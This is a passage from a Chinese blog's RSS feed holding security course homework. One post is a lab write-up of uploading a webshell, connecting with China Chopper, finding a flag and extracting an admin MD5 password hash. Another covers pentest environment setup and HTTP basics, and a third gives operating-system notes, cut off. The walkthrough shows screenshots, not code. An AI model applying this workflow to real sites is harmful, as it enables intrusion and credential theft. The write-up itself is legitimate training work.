&lt;p&gt;上传成功：&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230242965-1227725247.png&#34;
	width=&#34;217&#34;
	height=&#34;36&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230242965-1227725247_hu12494703646310481770.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230242965-1227725247_hu17099840601756550003.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;602&#34;
		data-flex-basis=&#34;1446px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;菜刀连接：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230243575-1912081798.png&#34;
	width=&#34;475&#34;
	height=&#34;250&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230243575-1912081798_hu14684207890565167035.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230243575-1912081798_hu16424070363598311018.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;190&#34;
		data-flex-basis=&#34;456px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230243786-1664286805.png&#34;
	width=&#34;538&#34;
	height=&#34;125&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230243786-1664286805_hu364701201788278130.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230243786-1664286805_hu17652126294579931325.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;430&#34;
		data-flex-basis=&#34;1032px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;成功进入：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244129-287653039.png&#34;
	width=&#34;554&#34;
	height=&#34;324&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244129-287653039_hu15723065072809595285.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244129-287653039_hu5494303434221324461.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;170&#34;
		data-flex-basis=&#34;410px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;找到flag：&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244394-506476082.png&#34;
	width=&#34;320&#34;
	height=&#34;56&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244394-506476082_hu18339898834496901279.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244394-506476082_hu8338652017695004802.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;571&#34;
		data-flex-basis=&#34;1371px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;关于数据库的一些姿势：&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244602-1030755578.png&#34;
	width=&#34;466&#34;
	height=&#34;369&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244602-1030755578_hu14130851654094570628.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244602-1030755578_hu10420892975118825558.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;303px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244799-520918257.png&#34;
	width=&#34;344&#34;
	height=&#34;154&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244799-520918257_hu12917603464245243847.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230244799-520918257_hu2051249202001502241.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;223&#34;
		data-flex-basis=&#34;536px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;以本实验为例：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245015-1012842696.png&#34;
	width=&#34;554&#34;
	height=&#34;116&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245015-1012842696_hu13481277171514481743.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245015-1012842696_hu6160630004490797747.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;477&#34;
		data-flex-basis=&#34;1146px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245236-545748512.png&#34;
	width=&#34;554&#34;
	height=&#34;319&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245236-545748512_hu9881226838420967362.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245236-545748512_hu8696832486474152000.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;173&#34;
		data-flex-basis=&#34;416px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;找到jieqi（杰奇）system（系统）users（用户）中的admin以及密码，md5解密一下21232f297a57a5a743894a0e4a801fc3：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245573-854876984.png&#34;
	width=&#34;554&#34;
	height=&#34;127&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245573-854876984_hu14087966850131005847.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245573-854876984_hu84327179272369933.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;436&#34;
		data-flex-basis=&#34;1046px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245791-1525641103.png&#34;
	width=&#34;320&#34;
	height=&#34;232&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245791-1525641103_hu15111852349949480860.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230245791-1525641103_hu14833641292488021125.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;137&#34;
		data-flex-basis=&#34;331px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实验完毕。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>i春秋web作业2.24——web渗透环境搭建与基础</title>
        <link>https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Tue, 25 Feb 2020 15:01:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;p&gt;Web安全工程师(入门班)&lt;/p&gt;
&lt;p&gt;【全国线上入门班53期】课后作业&lt;/p&gt;
&lt;p&gt;2020-2-24&lt;/p&gt;
&lt;p&gt;DorinXL&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;分别尝试安装一个Windows和Linux操作系统&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;想要在虚拟机上装系统，首先需要下载对应的镜像文件(.iso)，接着选择上对应的镜像文件按照向导的提示进行安装。&lt;/li&gt;
&lt;li&gt;在安装时也可以选择先安装一个包含空白硬盘的虚拟机，镜像文件可以之后在硬件设置中选择放入。&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230112844-589132592.png&#34;
	width=&#34;238&#34;
	height=&#34;230&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230112844-589132592_hu7978547033864634758.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230112844-589132592_hu11428440030653276038.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;103&#34;
		data-flex-basis=&#34;248px&#34;
	
&gt;新建包含空白硬盘的虚拟机的时候要选好操作系统。&lt;/li&gt;
&lt;li&gt;当向导结束后，开启虚拟机，按照操作系统提示进行设置，重启之后正常开机表示可以运行操作系统。&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113195-360184004.png&#34;
	width=&#34;511&#34;
	height=&#34;274&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113195-360184004_hu12679209838801846978.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113195-360184004_hu4035653454879094331.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;186&#34;
		data-flex-basis=&#34;447px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;2）自己搭建一个网站&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我们可以通过一些搭配来完成基于虚拟机的网站的搭建（比如LAMP、LNMP等），也可以去各大服务器厂商处购买云服务器以保证更高的需求（阿里云、腾讯云等）。&lt;/li&gt;
&lt;li&gt;以最简单的phpstudy为例&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113399-55241672.png&#34;
	width=&#34;72&#34;
	height=&#34;58&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113399-55241672_hu9362906834844417679.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113399-55241672_hu7398067473666307692.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;124&#34;
		data-flex-basis=&#34;297px&#34;
	
&gt;：&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113607-1992236565.png&#34;
	width=&#34;237&#34;
	height=&#34;198&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113607-1992236565_hu11320799397628508303.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113607-1992236565_hu10748339923309502995.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;119&#34;
		data-flex-basis=&#34;287px&#34;
	
&gt;启动phpstudy之后，在www文件夹下可以放置我们需要的网站源码。&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113983-449792594.png&#34;
	width=&#34;384&#34;
	height=&#34;165&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113983-449792594_hu17890221284458025805.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230113983-449792594_hu12700040856619205717.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;232&#34;
		data-flex-basis=&#34;558px&#34;
	
&gt;如果想要部署其他网站也可以放置在www文件夹下，然后按照对应路径访问。&lt;/li&gt;
&lt;li&gt;关于访问网站：我们在访问自己搭建的网站时，需要在url框中填入虚拟机的ip，查看ip可以用ipconfig指令来查看。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;3）分析网站和浏览器之前通信的HTTP协议&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTTP协议工作于客户端-服务端架构上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。&lt;/li&gt;
&lt;li&gt;HTTP协议的特点：简单快速、灵活、无状态、无连接，支持B/S和C/S&lt;/li&gt;
&lt;li&gt;客户端向服务器发送一个http请求时，格式包含：请求行、请求头部、空行和请求数据四个部分&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230114239-131065035.png&#34;
	width=&#34;250&#34;
	height=&#34;89&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230114239-131065035_hu14996379031875855208.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230114239-131065035_hu17618522404283812542.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;280&#34;
		data-flex-basis=&#34;674px&#34;
	
&gt;。&lt;/li&gt;
&lt;li&gt;以&lt;a class=&#34;link&#34; href=&#34;http://www.baidu.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.baidu.com&lt;/a&gt;抓包为例：&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230114420-1004422925.png&#34;
	width=&#34;388&#34;
	height=&#34;122&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230114420-1004422925_hu1567857554930138713.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230114420-1004422925_hu3745894169708566678.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;318&#34;
		data-flex-basis=&#34;763px&#34;
	
&gt;。&lt;/li&gt;
&lt;li&gt;服务器响应也有四个部分组成：状态行、消息报头、空行和响应正文&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230114632-494998075.jpg&#34;
	width=&#34;354&#34;
	height=&#34;158&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230114632-494998075_hu16121144825278417085.jpg 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/1858293-20200225230114632-494998075_hu17137727497792532387.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;224&#34;
		data-flex-basis=&#34;537px&#34;
	
&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;4）思考虚拟机的NAT模式与桥接模式的区别&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NAT模式：NAT是网络地址转换的意思，虚拟机通过把物理主机作为路由器来访问互联网，虚拟机和主机是从属关系。虚拟机之间可以相互访问。&lt;/li&gt;
&lt;li&gt;桥接模式：虚拟机和主机之间在同一网段，属于并列关系，主机和虚拟机处于对等地位。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;5）如何保存虚拟机的多个运行状态&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;拍摄快照可以保存任意时刻的虚拟机形态，在攻击靶机前最好对靶机进行拍摄快照，以便在靶机无法正常运行的时候回复到正常状态下。&lt;/li&gt;
&lt;li&gt;恢复快照可以回到拍摄快照的时候。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;6）思考HTTP代理的作用&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTTP代理可以看作是中转站，开启代理之后可以对包内信息进行拆解、分析，以便进行下一步操作。&lt;/li&gt;
&lt;li&gt;代理可以隐藏真实IP，免受别人的攻击，也可以保护自己。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>第七章 操作系统</title>
        <link>https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%83%E7%AB%A0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</link>
        <pubDate>Mon, 10 Feb 2020 09:09:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%83%E7%AB%A0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</guid>
        <description>&lt;h4 id=&#34;71-引言&#34;&gt;7.1 引言
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;计算机系统主要由两个部分组成：硬件和软件；软件又分为操作系统和应用程序。应用程序使用硬件来解决用户的问题，而操作系统控制用户对硬件的访问。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;711-操作系统&#34;&gt;7.1.1 操作系统
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;操作系统是计算机硬件和用户的一个接口，它使得其他程序更方便有效的运行，并能方便对计算机硬件和软件资源进行访问。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;712-自举过程&#34;&gt;7.1.2 自举过程
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;操作系统也是程序，在加载操作系统的过程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;很小一部分内存放在ROM中，其中有称为 &lt;strong&gt;自举&lt;/strong&gt; 的小程序。当计算机被加电时，CPU计数器被设置为自举程序的第一条命令，将操作系统从磁盘装入RAM内存，之后计数器的第一条命令为操作系统的命令，操作系统被加载完毕。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;72-演化&#34;&gt;7.2 演化
&lt;/h4&gt;&lt;h5 id=&#34;721-批处理系统&#34;&gt;7.2.1 批处理系统
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;批处理操作系统&lt;/strong&gt; 被设计于20世纪50年代。&lt;/li&gt;
&lt;li&gt;每个运行的程序叫做一个 &lt;strong&gt;作业&lt;/strong&gt; 。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;722-分时系统&#34;&gt;7.2.2 分时系统
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;多道程序&lt;/strong&gt; 概念被引入，&lt;strong&gt;分时&lt;/strong&gt; 是指资源可以被不同的作业分享，每个作业可以分到一段时间来使用资源。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;进程&lt;/strong&gt; 是指在内存中等待资源分配的程序。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;723-个人系统&#34;&gt;7.2.3 个人系统
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;个人计算机产生，需要一类适合这类计算机的操作系统。&lt;strong&gt;单用户操作系统&lt;/strong&gt; 诞生，例如DOS（磁盘操作系统）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;724-并行系统&#34;&gt;7.2.4 并行系统
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;并行系统的设计：同一计算机安装多个CPU，每个CPU可以处理一个程序或其一部分。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;725-分布式系统&#34;&gt;7.2.5 分布式系统
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;资源可以是分布式的，一个程序需要的文件可能分布在世界的不同地方。&lt;strong&gt;分布式系统&lt;/strong&gt; 结合了以往系统的特点和新的功能。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;726-实时系统&#34;&gt;7.2.6 实时系统
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;实时系统&lt;/strong&gt; 指在特定时间限制内完成任务，他们被用在实时应用程序中。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;73-组成部分&#34;&gt;7.3 组成部分
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;现代操作系统至少有以下四种功能：&lt;strong&gt;存储功能&lt;/strong&gt;、&lt;strong&gt;进程管理&lt;/strong&gt;、&lt;strong&gt;文件管理&lt;/strong&gt;、&lt;strong&gt;设备管理&lt;/strong&gt;。还有一个部分负责与外界通信，称为&lt;strong&gt;用户界面&lt;/strong&gt;或&lt;strong&gt;命令解释程序&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;现代操作系统的第一职责是内存管理，内存分配必须由操作系统分配，内存管理技术可以分为两类：单道程序和多道程序。在单道程序中，内存的大部分容量为一个程序独享。在多道程序中，多个程序同时在内存中。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
